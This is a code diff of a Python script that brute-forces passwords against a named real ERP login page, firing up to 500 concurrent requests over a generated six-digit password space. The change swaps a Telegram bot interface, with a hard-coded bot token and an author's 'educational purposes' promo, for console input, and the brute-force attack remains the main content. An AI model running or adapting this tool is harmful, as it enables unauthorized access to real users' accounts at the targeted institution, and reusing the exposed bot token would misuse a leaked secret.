@@ -1,13 +1,8 @@
 import requests
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from telegram import Update
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
 
 url = "https://erp.nttftrg.com/nttf2/authenticate.do"
-
-# Telegram Bot Token
-TELEGRAM_BOT_TOKEN = '8183907011:AAHiKmUZZlLDNez8bWATzIfETSc-hieP_pM'
 
 def send_request(username, password):
     data = {
@@ -51,29 +46,16 @@ def generate_passwords(username):
             for last_two in last_digit_range:
                 yield f"{first_two:02d}{second_two:02d}{last_two:02d}"
 
-def process_username(update: Update, context: CallbackContext):
-    username = update.message.text.strip()
+def main():
+    username = input("Enter username: ").strip()
     with ThreadPoolExecutor(max_workers=500) as executor:
         futures = [executor.submit(send_request, username, pwd) for pwd in generate_passwords(username)]
         for future in as_completed(futures):
             result = future.result()
             if result:
-                update.message.reply_text(result)
+                print(result)
                 executor.shutdown(wait=False)
                 return
-
-def start(update: Update, context: CallbackContext):
-    update.message.reply_text('Welcome!!\nThis script is just for educational purposes\nFIND ME ON SOCIAL MEDIA THIS TYPE OF SCRIPT\n....\nGitHub :GauravKrKalindi\nTelegram : @Mr_Professor_008\nXDA: GauravKrKalindi...\nEnter username:')
-
-def main():
-    updater = Updater(TELEGRAM_BOT_TOKEN, use_context=True)
-    dp = updater.dispatcher
-
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, process_username))
-
-    updater.start_polling()
-    updater.idle()
 
 if __name__ == '__main__':
     main()
